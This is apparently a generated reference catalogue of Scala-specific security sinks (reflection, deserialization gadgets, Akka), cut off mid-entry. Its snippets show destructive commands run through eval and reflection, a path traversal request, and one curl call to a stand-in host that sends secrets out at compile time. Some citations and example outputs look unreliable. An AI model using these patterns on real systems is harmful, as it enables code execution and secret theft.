# Scala Security Sinks — Comprehensive Reference

> **Generated**: 2026-05-10 via 13-agent parallel research swarm covering: type system, reflection, serialization, Akka, Play, collections, DB/ORM, Scala.js/Native, build system, effect systems, concurrency, Spark/big data, and cross-cutting creative research.
>
> **Scope**: Scala adds significant surface beyond Java — unique type system, runtime meta-programming, lazy evaluation, functional effect systems, actor model, and a distinct build/package ecosystem. **Java sinks** (`Runtime.exec`, `JNDI`, `ObjectInputStream`) apply directly to Scala apps; this file focuses on Scala-specific and Scala-ecosystem sinks.
>
> **Version focus**: Scala 2.13 / Scala 3.3+. Scala 2.12-specific issues noted.

---

## Quick Reference — Well-Known Sinks

### RCE / Code Execution
- `scala.tools.reflect.ToolBox.eval()` / `ToolBox.parse()` — runtime Scala compilation from string
- `scala.reflect.runtime.currentMirror` + `.reflectClass()` / `.reflectMethod()` — reflective call bypass
- Scala 3 `scala.quoted.staging.run` — runtime code generation equivalent to ToolBox
- `Macro.c.parse()` — compile-time code injection from user-controlled string
- Akka `JavaSerializer` (pre-2.4.17) — RCE via crafted serialized messages to remote actor system
- Apache Spark UDF/closure serialization — RCE by design on executors

### Deserialization
- `LazyList` — CVE-2022-36944 (CVSS 9.8): `Function0` gadget chain in `readObject`
- `TrieMap` — scala/bug#13002: arbitrary `Function1` invocation via `Hashing` field
- `scala.runtime.ObjectRef` — ysoserial `Scala1` chain: `PriorityQueue` + `BeanComparator` + `TemplatesImpl`
- Akka `JavaSerializer` / Kryo deserialization — same class of vulnerability as Java
- Scala Pickling `unpickle[Any]` — `$type` discriminator enables arbitrary class instantiation
- Circe `deriveConfiguredDecoder` — polymorphic ADT discriminator selects unintended subclass
- uPickle `ReadWriter` sealed trait — `$type` / `tagName` discriminator class instantiation
- Jsoniter-scala `JsonCodecMaker.make` — discriminator abuse; silent zero-fill on missing required fields

### SQL Injection
- Slick `#$` literal splicing — bypasses parameterization
- Doobie `Fragment.const()` — raw SQL fragment injection
- Quill `infix` / `executeQueryRaw` — raw SQL embedding
- Anorm `#$value` — literal interpolation bypass

### Server-Side Template Injection
- Play Twirl `@Html(userInput)` — explicitly bypasses auto-escaping
- Twirl `@variable` in `<script>`, `style="..."`, `onclick="..."` — HTML-escaping insufficient for JS/CSS contexts

### SSRF
- Play WS client URI parsing confusion — `http://trusted.com#@evil.com/` bypass
- Akka HTTP client host header injection
- Apache Spark configuration: `spark.eventLog.dir` to attacker HDFS

### Path Traversal
- Akka HTTP `getFromDirectory` / `getFromFile` — `\..` segments escape root on Windows (2016-09-30 advisory)
- http4s `FileService` / `ResourceService` — `../` and `//` traversal (CVE-2020-5280)

### DoS
- Scala 2.12 HashMap collision (no treeification) — O(n²) degradation
- LazyList / Stream memory exhaustion via unbounded forcing
- Play JSON/XML deeply nested body parser — stack overflow (CVE-2020-27196)
- ZIO `Queue.offerAll` silent hang with bounded queues
- `BigDecimal` with scientific notation CPU exhaustion (shared with Java)
- Akka HTTP `entity(as[T])` without `withSizeLimit` — OOM via large body; gzip-bomb via `decodeRequest`
- ZIO HTTP `Body.fromStream` without size bound — unbounded stream read OOM

### Header Injection
- Akka HTTP `RawHeader(name, value)` — no CRLF sanitisation; HTTP response splitting
- http4s `Header.Raw` from user input — response splitting / log injection

### CORS / Session
- http4s `CORS.policy.withAllowOriginAll` + `withAllowCredentials(true)` — credential theft
- Play session cookie storing `userId` / `role` — signed-not-encrypted, client-readable

### GraphQL (Sangria / Caliban)
- Missing `QueryReducer.rejectMaxDepth` / `rejectComplexity` — query DoS
- Introspection enabled in production
- Alias batching bypasses per-request rate limits / brute-force throttling

### Supply Chain / Build
- Coursier `COURSIER_REPOSITORIES` env var or `~/.config/coursier/repositories` — silent resolver substitution
- Scala Steward auto-merge PRs — auto-merged version bumps from compromised registry
- sbt `~/.sbt/credentials` — plaintext publish credentials, frequently committed or world-readable
- Tapir `decodeFailureHandler` — raw schema info in error responses; `serverSecurityLogic` ordering bypass

---

# Deep-Dive: Scala-Specific Sinks

---

## 1. Type System / Class Confusion

### 1.1 Path-Dependent Type on `null` Path Unsoundness
**Risk**: A `null` path can collapse the subtyping lattice through bad bounds, producing a universal cast to `Nothing`.

```scala
trait A { type L <: Nothing }
trait B { type L >: Any }
def toL(b: B)(x: Any): b.L = x
val p: B with A = null
// Universal cast from Any to Nothing:
println(toL(p)("hello"): Nothing)  // ClassCastException at use site
```

**Ref**: scabug — "soundness issue with path-dependent type on `null` path" (scala/bug#9633).

```json
{ "sink_id": "SCALA-TYPE-001", "category": "type-system", "title": "Path-dependent type null path unsoundness", "severity": "critical", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/9633", "title": "soundness issue with path-dependent type on null path", "author": "scabug", "date": "2016-01-29" }], "confidence": "confirmed" }
```

### 1.2 Mutation of Scala "Immutable" Collections via Unsafe Publication
**Risk**: Scala's `List` (`::`) and `Vector` use non-final `var` fields internally during construction. Unsafely publishing these to other threads can expose partially-constructed objects with null fields, violating JMM guarantees (SI-7838).

```scala
@volatile var sharedList: List[Int] = List(1, 2, 3)  // OK with @volatile
var unsafeList: List[Int] = List(1, 2, 3)  // Reader thread may see null head/tail
```

**Ref**: Jason Zaugg — SI-7838: "Offer stronger guarantees under JMM for List, Vector" (scala/bug#7838).

```json
{ "sink_id": "SCALA-TYPE-002", "category": "type-system", "title": "Immutable List/Vector non-final field race (SI-7838)", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/7838", "title": "Offer stronger guarantees under JMM for List, Vector", "author": "retronym", "date": "2013-09-12" }], "confidence": "confirmed" }
```

### 1.3 Covariant GADT Pattern Matching Unsoundness
**Risk**: Covariant GADT pattern matching can create a `ClassCastException` by subverting type refinement through `Nothing`.

```scala
sealed trait Node[+A]
case class L[C,D](f: C => D) extends Node[C => D]
def test[A,B](n: Node[A => B]): A => B = n match {
  case l: L[c,d] => l.f
}
test(new L[Int,Int](identity) with Node[Nothing]: Node[Int => String])
```

**Ref**: scabug — "pattern matching over covariant GADT unsound" (scala/bug#8563).

```json
{ "sink_id": "SCALA-TYPE-003", "category": "type-system", "title": "Covariant GADT pattern matching unsoundness", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/8563", "title": "pattern matching over covariant GADT unsound", "author": "scabug", "date": "2014-05-05" }], "confidence": "confirmed" }
```

### 1.4 `asInstanceOf` — Universal Type Escape Hatch
**Taint requirement**: developer-supplied type parameter, not network input. Treat as **footgun / audit signal**, not directly exploitable.
**Risk**: Scala's `asInstanceOf` provides an unchecked cast that completely bypasses the type system with no runtime checking for generic types due to erasure.

```scala
def unsafe[T](x: Any): T = x.asInstanceOf[T]
val x: String = unsafe[String](42) // ClassCastException only at use-site
```

**Ref**: Scala Language Specification §12.1.

```json
{ "sink_id": "SCALA-TYPE-004", "category": "type-system", "title": "asInstanceOf universal type escape", "severity": "medium", "sources": [{ "type": "research_paper", "url": "https://arxiv.org/abs/2311.04527", "title": "API-driven Program Synthesis for Testing Static Typing Implementations", "author": "Sotiropoulos, Chaliasos, Su", "date": "2023-11-08" }], "confidence": "confirmed" }
```

### 1.5 Implicit Resolution Hijacking Through Scope Pollution
**Risk**: Scala's implicit resolution mechanism can be hijacked by introducing competing implicits into scope — a form of dependency confusion at the type level.

```scala
trait Serializer[T] { def serialize(t: T): String }
// Attacker adds competing implicit with higher priority:
object Attack { implicit val maliciousIntSerializer: Serializer[Int] = (i: Int) => "MALICIOUS" }
import Attack.maliciousIntSerializer
implicitly[Serializer[Int]].serialize(42)  // "MALICIOUS:42" instead of "42"
```

**Ref**: scala/bug#11787, scala/bug#11596 — implicit resolution regression and precedence issues.

```json
{ "sink_id": "SCALA-TYPE-005", "category": "type-system", "title": "Implicit resolution hijacking via scope pollution", "severity": "medium", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/11787", "title": "Inaccessible method can cause implicit conversion search to fail", "author": "travisbrown", "date": "2022-04-19" }], "confidence": "likely", "note": "Design property, not a CVE. Requires malicious dev or compromised dep in import scope." }
```

### 1.6 Structural Type Reflection Bypass
**Risk**: Scala's structural types (`{ def foo: Bar }`) use runtime reflection for invocation, bypassing compile-time access checks.

```scala
type Hacker = { def privateMethod(): Unit }
class Sensitive { private def privateMethod(): Unit = println("HACKED!") }
(new Sensitive).asInstanceOf[{ def privateMethod(): Unit }].privateMethod()
```

**Ref**: Scala Language Specification §3.2.7 — Structural types.

```json
{ "sink_id": "SCALA-TYPE-006", "category": "type-system", "title": "Structural type reflection bypass", "severity": "medium", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/10619", "title": "2.12.4 regression: unstable paths in types", "author": "sjrd", "date": "2017-11-21" }], "confidence": "confirmed" }
```

### 1.7 Scala 3 `erased` Qualifier — Runtime Security Check Removal
**Risk**: Parameters annotated `erased` in Scala 3 are completely removed from bytecode. A library can appear to require authentication that never actually executes.

```scala
// Library defines:
trait AuthenticatedService {
  def adminOperation(erased token: AuthToken): Unit  // token removed at compile time!
}
// Any caller can invoke without providing a token at runtime (it's erased)
```

**Ref**: Scala 3 reference — `erased` definitions.

```json
{ "sink_id": "SCALA-TYPE-007", "category": "type-system", "title": "Scala 3 erased qualifier removes runtime security checks", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/scala3/reference/experimental/erased-defs.html", "title": "Scala 3 Erased Definitions", "author": "EPFL", "date": "2023-01-01" }], "confidence": "confirmed" }
```

### 1.8 Implicit Conversion — Silent Validation Bypass
**Risk**: An `implicit def` or `given Conversion` from `String` (or other untrusted type) to a domain type silently turns raw user input into a "validated" value with no runtime check. Unlike `asInstanceOf` (runtime cast), this happens at compile-time resolution — code reviewers see only `: SafeUrl` and assume validation occurred. Any imported scope (transitive deps, traits) can introduce such conversions.

```scala
class SafeUrl(val raw: String)  // domain type implying validation
object SafeUrl {
  // Silent conversion — NO validation, but call sites look type-checked:
  implicit def fromString(s: String): SafeUrl = new SafeUrl(s)
}
def fetch(url: SafeUrl): Response = httpClient.get(url.raw)
fetch(request.params("target"))  // raw user input → SafeUrl with no validation
```

**Ref**: Kodem Security — "Tips to Reduce Scala Vulnerabilities"; Scala 3 `given Conversion` reference.

```json
{ "sink_id": "SCALA-TYPE-008", "category": "type-system", "title": "Implicit conversion silently bypasses validation logic", "severity": "medium", "sources": [{ "type": "blog", "url": "https://www.kodemsecurity.com/resources/tips-to-reduce-scala-vulnerabilities", "title": "Tips to Reduce Scala Vulnerabilities", "author": "Kodem Security", "date": "2024-01-01" }, { "type": "documentation", "url": "https://docs.scala-lang.org/scala3/reference/contextual/conversions.html", "title": "Scala 3 Implicit Conversions", "author": "EPFL", "date": "2024-01-01" }], "confidence": "likely", "note": "Compile-time bypass of validation; severity depends on whether the converted type is trusted by downstream code." }
```

---

## 2. Reflection & Runtime Meta-Programming

### 2.1 `ToolBox.eval` — Arbitrary Code Execution at Runtime
**Risk**: Scala's `ToolBox.eval()` compiles and executes arbitrary Scala source strings at runtime — equivalent to `eval()` in dynamic languages.

```scala
import scala.reflect.runtime.universe._
import scala.tools.reflect.ToolBox
val tb = runtimeMirror(getClass.getClassLoader).mkToolBox()
val userInput: String = """Runtime.getRuntime.exec("rm -rf /")"""
tb.eval(tb.parse(userInput))
```

**Ref**: Scala Reflection Overview — `ToolBox` API.

```json
{ "sink_id": "SCALA-REFL-001", "category": "reflection", "title": "ToolBox.eval arbitrary code execution", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/reflection/overview.html", "title": "Scala Reflection Overview", "author": "Heather Miller, Eugene Burmako, Philipp Haller", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.2 `currentMirror` — Implicit Reflective Access
**Risk**: `scala.reflect.runtime.currentMirror` auto-resolves the runtime mirror for the current classloader, enabling reflective code execution from any context.

```scala
import scala.reflect.runtime.{currentMirror, universe => ru}
val rtClass = currentMirror.staticClass("java.lang.Runtime")
val rtMethod = rtClass.info.member(ru.TermName("exec")).asMethod
currentMirror.reflect(Runtime.getRuntime).reflectMethod(rtMethod)("id")
```

**Ref**: Scala `currentMirror` API.

```json
{ "sink_id": "SCALA-REFL-002", "category": "reflection", "title": "currentMirror reflective code execution", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-lang.org/api/2.13.15/scala-reflect/", "title": "Scala Runtime Reflection API", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.3 Scala 3 `staging.run` — Runtime Code Generation
**Risk**: In Scala 3, `scala.quoted.staging.run` evaluates quoted expressions at runtime — the Scala 3 equivalent of `ToolBox.eval`.

```scala
import scala.quoted.staging.{Compiler, run}
given Compiler = Compiler.make(getClass.getClassLoader)
run { '{ Runtime.getRuntime.exec("id") } }
```

**Ref**: Scala 3 Runtime Staging documentation.

```json
{ "sink_id": "SCALA-REFL-003", "category": "reflection", "title": "Scala 3 staging.run runtime code generation", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/scala3/reference/metaprogramming/staging.html", "title": "Scala 3 Runtime Staging", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.4 Macro `c.parse()` — Compile-Time Code Injection
**Risk**: Within macro implementations, `c.parse(string)` parses arbitrary Scala source into ASTs compiled at the call site. If input is user-controlled, this yields arbitrary code injection at compile time.

```scala
def dangerousImpl(c: scala.reflect.macros.Context)(code: c.Expr[String]): c.Expr[Any] = {
  import c.universe._
  val injectedTree = c.parse(s"""Runtime.getRuntime.exec("rm -rf /")""")
  c.Expr[Any](injectedTree)
}
```

**Ref**: Eugene Burmako — Scala Macros Guide.

```json
{ "sink_id": "SCALA-REFL-004", "category": "reflection", "title": "Macro c.parse() compile-time code injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/macros/overview.html", "title": "Scala Macros Guide", "author": "Eugene Burmako", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.5 Quasiquote Unquoting — AST Injection
**Risk**: Quasiquotes (`q"..."`) unquote `Tree` values via `$` splicing. An attacker who controls unquoted `Tree` arguments can inject arbitrary code structure.

```scala
val attackerControlledTree: Tree = q"Runtime.getRuntime.exec(\"id\")"
val injected = q""" println("start"); $attackerControlledTree; println("done") """
val tb = runtimeMirror(getClass.getClassLoader).mkToolBox()
tb.eval(injected)
```

**Ref**: Denys Shabalin — Scala Quasiquotes Guide.

```json
{ "sink_id": "SCALA-REFL-005", "category": "reflection", "title": "Quasiquote unquoting AST injection", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/quasiquotes/intro.html", "title": "Scala Quasiquotes Guide", "author": "Denys Shabalin", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.6 `Symbol.asMethod` — Access Bypass via Unchecked Downcast
**Risk**: Scala reflection's `Symbol.asClass/Method/Term` enables bypassing access modifiers to find and invoke private members.

```scala
class Secret { private def hiddenCmd(cmd: String): String = cmd }
val mirror = currentMirror
val secretType = mirror.staticClass("Secret").info
val hiddenMethod = secretType.member(ru.TermName("hiddenCmd")).asMethod
mirror.reflect(new Secret).reflectMethod(hiddenMethod)("cat /etc/passwd")
```

**Ref**: Scala Symbols, Trees, and Types documentation.

```json
{ "sink_id": "SCALA-REFL-006", "category": "reflection", "title": "Symbol.asMethod access bypass", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/reflection/symbols-trees-types.html", "title": "Scala Symbols, Trees, and Types", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.7 `TypeTag` — Erasure Bypass for Reflective Access
**Risk**: `TypeTag` carries compile-time type information to runtime, defeating JVM type erasure and enabling reflective access to members invisible via Java reflection.

```scala
def access[T: ru.TypeTag](instance: T): Unit = {
  val tpe = ru.typeOf[T]
  tpe.members.foreach(sym => println(s"${sym.name}: ${sym.kind}"))
}
```

**Ref**: Scala TypeTags and Manifests documentation.

```json
{ "sink_id": "SCALA-REFL-007", "category": "reflection", "title": "TypeTag erasure bypass for reflective access", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/reflection/typetags-manifests.html", "title": "Scala TypeTags and Manifests", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 2.8 Scala 3 `inline` + `compiletime.codeOf` — Supply-Chain Compile-Time Exfiltration
**Risk**: `inline def` with `${ ... }` splices run arbitrary code at *compile time* in the consumer's project — same supply-chain risk as Scala 2 macro annotations (§9.6). `scala.compiletime.codeOf` serialises the source text of its argument into a `String` literal embedded in bytecode, leaking caller-site secrets (API keys, tokens) passed as inline arguments into the compiled artifact's constant pool.

```scala
// Published library dependency (malicious or compromised):
import scala.compiletime.codeOf
inline def log[T](inline x: T): T = ${
  import scala.sys.process._
  ("curl https://c2.evil.com/?src=" + codeOf(x)).! // runs in consumer's compiler JVM
  '{ x }
}
// Consumer: log(awsSecret) — literal value of awsSecret embedded in .class constant pool
```

**Ref**: Scala 3 Reference — Inline; `scala.compiletime` API.

```json
{ "sink_id": "SCALA-REFL-008", "category": "reflection", "title": "Scala 3 inline + codeOf supply-chain compile-time exfiltration", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/scala3/reference/metaprogramming/inline.html", "title": "Scala 3 Inline", "author": "EPFL", "date": "2024-01-01" }, { "type": "documentation", "url": "https://scala-lang.org/api/3.x/scala/compiletime.html", "title": "scala.compiletime API", "author": "EPFL", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## 3. Serialization

### 3.1 CVE-2022-36944 — LazyList Deserialization Gadget Chain (CVSS 9.8)
**Risk**: `scala-library.jar` (2.13.x < 2.13.9, 2.12.x < 2.12.16) contains a deserialization gadget chain in `LazyList`. The `lazyState: () => LazyList.State[A]` field is serialized as `Function0` — a forged stream substitutes any serializable `Function0` subclass for arbitrary code execution. Fixed in 2.13.9 and 2.12.16.

```scala
// Vulnerable Scala 2.13.x; fixed in 2.13.9
// A forged serialization stream replaces lazyState with a malicious Function0
// enabling RCE when LazyList.readObject() invokes tail.prependedAll(init)
```

**Ref**: NthPortal/lrytz — scala/scala#10118; NVD CVE-2022-36944.

```json
{ "sink_id": "SCALA-SER-001", "category": "serialization", "title": "LazyList deserialization gadget chain (CVE-2022-36944)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36944", "title": "CVE-2022-36944 Detail", "author": "NVD", "date": "2022-09-25" }, { "type": "github", "url": "https://github.com/scala/scala/pull/10118", "title": "Prevent Function0 execution during LazyList deserialization", "author": "NthPortal/lrytz", "date": "2022-09-01" }], "confidence": "confirmed" }
```

### 3.2 TrieMap Deserialization — Arbitrary `Function1` Invocation (scala/bug#13002)
**Risk**: `TrieMap.readObject()` invokes `hashingobj.hash(key)` — an attacker-crafted `Hashing` with arbitrary `Function1` yields code execution.

```scala
import scala.collection.concurrent.TrieMap
import scala.util.hashing.Hashing
val payload: Any => Any = (arg: Any) => { Runtime.getRuntime.exec("id"); arg }
val hashing = Hashing.fromFunction(payload)
// Serialize TrieMap with this hashing — on deserialization, payload executes
```

**Ref**: scala/bug#13002.

```json
{ "sink_id": "SCALA-SER-002", "category": "serialization", "title": "TrieMap deserialization Function1 gadget", "severity": "critical", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/13002", "title": "TrieMap deserialization invokes arbitrary Function1", "author": "scala/bug", "date": "2022-10-01" }], "confidence": "confirmed" }
```

### 3.3 ysoserial `Scala1` — `ObjectRef` + `PriorityQueue` + `TemplatesImpl`
**Risk**: The `scala.runtime.ObjectRef` class in `scala-library.jar` acts as a gadget in Java deserialization chains. Any Scala app using `ObjectInputStream.readObject()` with attacker-controlled data is vulnerable.

```scala
// ysoserial payload: Scala1 uses:
// PriorityQueue (readObject) → BeanComparator.compare()
//   → ObjectRef.set() → TemplatesImpl.getOutputProperties() → RCE
```

**Ref**: Chris Frohoff — ysoserial; Alvaro Muñoz — "Scala Java Deserialization: A Primer" (BlackHat USA 2016).

```json
{ "sink_id": "SCALA-SER-003", "category": "serialization", "title": "Scala1 ysoserial ObjectRef gadget chain", "severity": "critical", "sources": [{ "type": "github", "url": "https://github.com/frohoff/ysoserial", "title": "ysoserial — Scala1", "author": "Chris Frohoff", "date": "2015-01-28" }, { "type": "conference", "url": "https://www.blackhat.com/docs/us-16/materials/us-16-Keist-Scala-Java-Deserialization-A-Primer-For-The-Working-Security-Engineer.pdf", "title": "Scala Java Deserialization Primer", "author": "Alvaro Muñoz", "date": "2016-08-03" }], "confidence": "confirmed" }
```

### 3.4 Scala 2 HashMap Hash Collision DoS (scala/bug#11203)
**Risk**: Scala 2's `HashMap` uses `ListMap` for collision buckets (not balanced trees like Java 8+). An attacker sending colliding keys degrades operations from O(1) to O(n²).

```scala
import scala.collection.immutable.HashMap
// 32-bit hash collision attack on String keys => O(n²) blowup
// Affects Play routes, Akka HTTP headers, Play JSON parsing
```

**Ref**: James Roper — scala/bug#11203.

```json
{ "sink_id": "SCALA-SER-004", "category": "serialization", "title": "HashMap collision DoS via hash flooding", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/11203", "title": "DoS vulnerability in Scala 2.12 HashMap", "author": "jroper", "date": "2017-05-12" }], "confidence": "confirmed" }
```

### 3.5 Scala Pickling — `$type` Discriminator Abuse (Legacy / Unmaintained)
**Risk**: Scala Pickling's runtime reflection mode allows arbitrary class instantiation via the `$type` discriminator field in JSON/binary format. Project unmaintained since ~2016 — modern apps use Circe / uPickle / Jsoniter; ADT-discriminator decoders in those libraries carry the same risk class (see Coverage Gaps).

```scala
import scala.pickling.json._
val untrustedJson = """{ "$type": "com.malicious.Executor", "command": "rm -rf /" }"""
// unpickle[Any] reads $type and instantiates any class on classpath
```

**Ref**: Scala Pickling Team — EPFL.

```json
{ "sink_id": "SCALA-SER-005", "category": "serialization", "title": "Scala Pickling $type discriminator arbitrary class instantiation", "severity": "high", "sources": [{ "type": "github", "url": "https://github.com/scala/pickling", "title": "scala/pickling", "author": "EPFL", "date": "2013-01-01" }], "confidence": "likely" }
```

### 3.6 Circe `deriveConfiguredDecoder` — Polymorphic ADT Discriminator Abuse
**Risk**: `circe-generic-extras` `deriveConfiguredDecoder` with `Configuration.default.withDiscriminator("type")` instantiates the ADT subtype named in the JSON `type` field. If the sealed hierarchy is not exhaustive or if an open `trait` is decoded as `Any`, an attacker supplies an unexpected discriminator value that resolves to an unintended subclass, triggering unsafe initialisation logic in its constructor or companion object.

```scala
import io.circe.generic.extras._, io.circe.parser._
implicit val cfg: Configuration = Configuration.default.withDiscriminator("type")

@ConfiguredJsonCodec sealed trait Command
case class Exec(cmd: String) extends Command
case class Fetch(url: String) extends Command

// Attacker input — if hierarchy is open or reflection-based:
decode[Command]("""{"type":"com.internal.AdminCommand","payload":"drop-db"}""")
// Fails safely on sealed, but open/runtime-reflection modes may instantiate unexpected class
```

**Ref**: circe-generic-extras — Configuration and ADT encoding.

```json
{ "sink_id": "SCALA-SER-006", "category": "serialization", "title": "Circe deriveConfiguredDecoder ADT discriminator abuse", "severity": "medium", "sources": [{ "type": "github", "url": "https://github.com/circe/circe-generic-extras", "title": "circe-generic-extras — Configuration", "author": "Circe Contributors", "date": "2023-01-01" }, { "type": "documentation", "url": "https://circe.github.io/circe/codecs/adt.html", "title": "Circe — ADT Encoding", "author": "Circe Contributors", "date": "2024-01-01" }], "confidence": "likely" }
```

### 3.7 uPickle `ReadWriter` for Sealed Traits — `$type` Discriminator Instantiation
**Risk**: uPickle derives `ReadWriter` for `sealed trait` hierarchies using a configurable discriminator field (default `$type`). The discriminator value selects the concrete subtype to instantiate. If untrusted JSON controls the `$type` field and the hierarchy includes subtypes with side-effecting constructors or companion `apply` methods, an attacker can trigger unintended class instantiation. The discriminator key is globally reconfigurable via `tagName`, making audits of multi-library systems error-prone.

```scala
import upickle.default._

sealed trait Action derives ReadWriter
case class Shell(cmd: String) extends Action derives ReadWriter
case class Noop() extends Action derives ReadWriter

// Attacker sends: {"$type":"Shell","cmd":"id"}
val a = read[Action]("""{"$type":"Shell","cmd":"id"}""")
// a == Shell("id") — constructor called with attacker-supplied field
```

**Ref**: uPickle documentation — Sealed Traits / `tagName`.

```json
{ "sink_id": "SCALA-SER-007", "category": "serialization", "title": "uPickle sealed-trait $type discriminator unintended class instantiation", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://com-lihaoyi.github.io/upickle/", "title": "uPickle — Sealed Traits", "author": "Li Haoyi", "date": "2024-01-01" }], "confidence": "likely" }
```

### 3.8 Jsoniter-scala `JsonCodecMaker.make` — Discriminator Abuse and Missing-Field DoS
**Risk**: `JsonCodecMaker.make` with `CodecMakerConfig.withDiscriminatorFieldName(Some("type"))` generates macro-derived codecs for sealed hierarchies. Two risks: (1) discriminator abuse — the `type` field selects which case class is decoded; attacker input selects edge-case subtypes with heavy initialisation. (2) `withRequiredFields=false` (pre-2.14 default) silently fills missing required fields with zero-values rather than erroring, bypassing mandatory-field validation and producing objects in inconsistent state that downstream code does not expect.

```scala
import com.github.plokhotnyuk.jsoniter_scala.macros._
import com.github.plokhotnyuk.jsoniter_scala.core._

sealed trait Cmd
case class Run(script: String, timeout: Int) extends Cmd
case class Stop(force: Boolean) extends Cmd

implicit val codec: JsonValueCodec[Cmd] = JsonCodecMaker.make

// Missing `timeout` field — with lenient config, timeout == 0 silently:
readFromString[Cmd]("""{"type":"Run","script":"evil.sh"}""")
```

**Ref**: jsoniter-scala — `CodecMakerConfig` discriminator configuration.

```json
{ "sink_id": "SCALA-SER-008", "category": "serialization", "title": "Jsoniter-scala discriminator abuse and missing-field silent zero-fill", "severity": "medium", "sources": [{ "type": "github", "url": "https://github.com/plokhotnyuk/jsoniter-scala", "title": "jsoniter-scala — CodecMakerConfig", "author": "Andriy Plokhotnyuk", "date": "2024-01-01" }, { "type": "issue", "url": "https://github.com/plokhotnyuk/jsoniter-scala/issues/244", "title": "Option for DiscriminatorValueCollisions", "author": "plokhotnyuk", "date": "2019-12-01" }], "confidence": "likely" }
```

---

## 4. Akka Actor System

### 4.1 Akka JavaSerializer — Default Remote RCE (Akka Advisory 2017-02-10)
**Risk**: Akka Remote used `JavaSerializer` as default prior to 2.4.17. An attacker connecting to an Akka Remote ActorSystem sends crafted serialized Java objects for RCE. (Note: no CVE assigned — vendor advisory only. CVE-2020-9480 is the *Spark* standalone master bypass, see §12.3.)

```scala
// Vulnerable config (pre-2.4.17 default):
akka.actor.provider = "akka.remote.RemoteActorRefProvider"
akka.remote.netty.tcp.port = 2552
// An adjacent attacker gains RCE via crafted serialized message
```

**Ref**: Akka Team — "Java Serialization — Fixed in Akka 2.4.17".

```json
{ "sink_id": "SCALA-AKKA-001", "category": "akka", "title": "Akka JavaSerializer default remote RCE", "severity": "critical", "sources": [{ "type": "advisory", "url": "https://doc.akka.io/libraries/akka-core/current/security/2017-02-10-java-serialization.html", "title": "Java Serialization Fixed in Akka 2.4.17", "author": "Akka Team", "date": "2017-02-10" }], "confidence": "confirmed" }
```

### 4.2 CVE-2018-16115 — Akka AES128CounterSecureRNG Broken Entropy
**Risk**: Akka `AES128CounterSecureRNG` repeats random values after ~16KB (CVSS 9.1), silently breaking TLS confidentiality.

**Ref**: Akka Security Advisory — CVE-2018-16115.

```json
{ "sink_id": "SCALA-AKKA-002", "category": "akka", "title": "Akka AES128CounterSecureRNG entropy exhaustion", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-16115", "title": "CVE-2018-16115", "author": "NVD", "date": "2018-09-07" }], "confidence": "confirmed" }
```

### 4.3 Akka Unauthenticated Cluster Joining
**Risk**: Default cluster configuration without TLS mutual auth allows any network peer to join and receive all gossip data, including actor state and serialized messages.

**Ref**: Akka Cluster Security documentation.

```json
{ "sink_id": "SCALA-AKKA-003", "category": "akka", "title": "Unauthenticated Akka cluster node joining", "severity": "high", "sources": [{ "type": "documentation", "url": "https://doc.akka.io/docs/akka/current/security/", "title": "Akka Security", "author": "Lightbend", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 4.4 Akka Actor `tell` vs `ask` Message Interleaving Race
**Risk**: Akka's `ask` creates a temporary `Future` — message ordering is not guaranteed between the ask and subsequent messages, enabling TOCTOU attacks in security checks.

```scala
class AuthActor extends Actor {
  def receive = {
    case CheckPermission(user, resource) =>
      (checker ? Check(user, resource)).mapTo[Boolean].pipeTo(sender())
      // Another message can be processed before the ask completes
  }
}
```

**Ref**: Akka Message Delivery Reliability documentation.

```json
{ "sink_id": "SCALA-AKKA-004", "category": "akka", "title": "Akka ask pattern message interleaving race", "severity": "high", "sources": [{ "type": "documentation", "url": "https://doc.akka.io/docs/akka/current/general/message-delivery-reliability.html", "title": "Akka Message Delivery Reliability", "author": "Lightbend", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 4.5 Akka HTTP `getFromFile` / `getFromDirectory` — Path Traversal (Windows)
**Risk**: On Windows, `getFromDirectory`, `getFromBrowseableDirectory`, and `getFromFile` directives do not normalise backslash-encoded path segments. A request containing `\..\..\` (URL-encoded) escapes the configured root and serves arbitrary files readable by the server process. Fixed in Akka HTTP 10.0.6 / 2.4.11.2.

```scala
// Vulnerable route:
path("files" / RemainingPath) { filePath =>
  getFromDirectory("C:\\webapp\\public")(filePath.toString)
}
// GET /files/\..\..\Windows\win.ini  → serves win.ini
```

**Ref**: Akka HTTP Security Advisory — Directory Traversal in FileDirectives (2016-09-30).

```json
